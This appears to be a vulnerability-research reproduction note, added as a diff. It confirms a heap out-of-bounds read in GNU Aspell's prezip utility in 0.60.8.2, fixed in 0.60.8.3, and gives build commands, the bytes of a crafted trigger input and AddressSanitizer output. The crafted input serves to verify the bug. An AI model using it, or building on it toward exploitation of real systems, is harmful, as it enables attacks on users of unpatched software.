@@ -1,0 +1,41 @@
+Real released Aspell source, 2026-11-25 18:47Z (CVE-2026-75818)
+
+Provisioning (read-only public fetch, no target probes):
+  https://ftp.gnu.org/gnu/aspell/aspell-0.60.8.2.tar.gz
+    sha256 57fe4863eae6048f72245a8575b44b718fb85ca14b9f8c0afc41b254dfd76919
+  https://ftp.gnu.org/gnu/aspell/aspell-0.60.8.3.tar.gz
+    sha256 0534eae11132405120d11e46bf595bd5dd189bc124ba77a5dd6aae861b48a162
+
+Source identity:
+  aspell-0.60.8.2/prog/prezip.c sha256 9ce9ad1e1a5bc332be9930e9f70304f31e83ca494e5317eff129d1d81e2d9a6e
+    == pins/prezip.vuln.c (byte-identical, cmp)
+  aspell-0.60.8.3/prog/prezip.c sha256 1fedfd4ff439a9ba65a8d7d203a527aba02332b445f4c3412a22f5186f8fb08e
+    == pins/prezip.fixed.c (byte-identical, cmp)
+
+Reproduce: bash harness/real-release.sh (from lab/frontier/aspell2shell)
+
+Build (per release, inside extracted tree):
+  clang -fsanitize=address -fno-omit-frame-pointer -g -O1 -I. prog/prezip.c -o prezip-bin-asan-$v
+Both builds rc 0. This is the release's own prezip-bin target source
+(Makefile.in: am_prezip_bin_OBJECTS = prog/prezip.$(OBJEXT)).
+
+Input: harness/evidence/crafted.bin (02 1e ff ff 41 'MISHE-75818-OOB-' 1f ff)
+Safe:  harness/evidence/crafted-clean.bin (encoder round-trip HELLO/WORLD)
+
+0.60.8.2 + crafted: rc 1
+  ERROR: AddressSanitizer: heap-buffer-overflow
+  READ of size 1
+  #0 ... in main .../aspell-0.60.8.2/prog/prezip.c:173:47
+  #1 ... in main .../aspell-0.60.8.2/prog/prezip.c:154:23
+  SUMMARY: AddressSanitizer: heap-buffer-overflow ... prezip.c:173:47 in main
+0.60.8.2 + safe: rc 0, stdout "HELLO\nWORLD\n"
+0.60.8.3 + crafted: rc 3, "corrupt input", no ASan report
+0.60.8.3 + safe: rc 0, stdout "HELLO\nWORLD\n"
+
+Raw stderr/stdout: lab/frontier/aspell2shell/real-build/evidence/
+(gitignored provisioning artifacts; regenerate with the script above).
+
+Interpretation: the OOB read is confirmed in the actual released binaries'
+source, not just a locally pinned copy. Still rung 3: prezip-bin is an
+offline word-list utility. No runtime dictionary-load consumer of prezip
+streams was found in the release source (see status report).
